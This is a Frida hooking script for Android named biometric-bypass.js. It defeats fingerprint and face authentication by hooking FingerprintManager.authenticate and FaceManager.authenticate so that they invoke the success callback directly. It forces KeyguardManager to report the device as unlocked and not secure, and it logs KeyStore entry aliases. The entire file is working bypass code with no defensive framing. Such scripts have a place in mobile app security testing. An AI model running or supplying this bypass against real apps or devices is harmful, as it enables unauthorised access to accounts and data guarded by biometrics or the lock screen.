// biometric-bypass.js — Bypass fingerprint/face authentication
Java.perform(function() {
    var Tag = "BIOMETRIC_BYPASS";

    // Bypass BiometricPrompt (Android 9+)
    try {
        var BiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt");
        // This is abstract, so we hook the callback
    } catch(e) {}

    // Bypass FingerprintManager (Android 6-9)
    try {
        var FingerprintManager = Java.use("android.hardware.fingerprint.FingerprintManager");

        FingerprintManager.authenticate.overload("android.hardware.fingerprint.FingerprintManager$CryptoObject", "android.os.CancellationSignal", "int", "android.hardware.fingerprint.FingerprintManager$AuthenticationCallback", "android.os.Handler").implementation = function(crypto, cancel, flags, callback, handler) {
            send({type: "biometric", action: "authenticate_attempt", bypass: "FingerprintManager"});
            console.log("[!] FingerprintManager.authenticate intercepted");

            // Simulate successful authentication
            var handlerClass = Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationCallback");
            var handlerInstance = Java.cast(callback, handlerClass);
            handlerInstance.onAuthenticationSucceeded(null);
            return null;
        };
    } catch(e) {
        console.log("[*] FingerprintManager not available: " + e);
    }

    // Bypass KeyguardManager
    try {
        var KeyguardManager = Java.use("android.app.KeyguardManager");

        KeyguardManager.isDeviceLocked.implementation = function() {
            send({type: "biometric", action: "isDeviceLocked", result: false});
            console.log("[*] KeyguardManager.isDeviceLocked -> false");
            return false;
        };

        KeyguardManager.isKeyguardSecure.implementation = function() {
            send({type: "biometric", action: "isKeyguardSecure", result: false});
            console.log("[*] KeyguardManager.isKeyguardSecure -> false");
            return false;
        };

        KeyguardManager.isDeviceLocked.overload("android.os.UserHandle").implementation = function(user) {
            send({type: "biometric", action: "isDeviceLocked", result: false});
            return false;
        };
    } catch(e) {
        console.log("[*] KeyguardManager not available: " + e);
    }

    // Bypass AndroidKeyStore
    try {
        var KeyStore = Java.use("java.security.KeyStore");
        KeyStore.getEntry.overload("java.lang.String", "java.security.KeyStore$ProtectionParameter").implementation = function(alias, protection) {
            send({type: "biometric", action: "KeyStore.getEntry", alias: alias});
            return this.getEntry(alias, protection);
        };
    } catch(e) {}

    // Bypass FaceManager (Android 9+)
    try {
        var FaceManager = Java.use("android.hardware.face.FaceManager");
        FaceManager.authenticate.overload("android.hardware.face.FaceManager$CryptoObject", "android.os.CancellationSignal", "int", "android.hardware.face.FaceManager$AuthenticationCallback", "android.os.Handler").implementation = function(crypto, cancel, flags, callback, handler) {
            send({type: "biometric", action: "authenticate_attempt", bypass: "FaceManager"});
            console.log("[!] FaceManager.authenticate intercepted");
            var handlerClass = Java.use("android.hardware.face.FaceManager$AuthenticationCallback");
            var handlerInstance = Java.cast(callback, handlerClass);
            handlerInstance.onAuthenticationSucceeded(null);
            return null;
        };
    } catch(e) {}

    console.log("[*] Biometric bypass loaded");
});
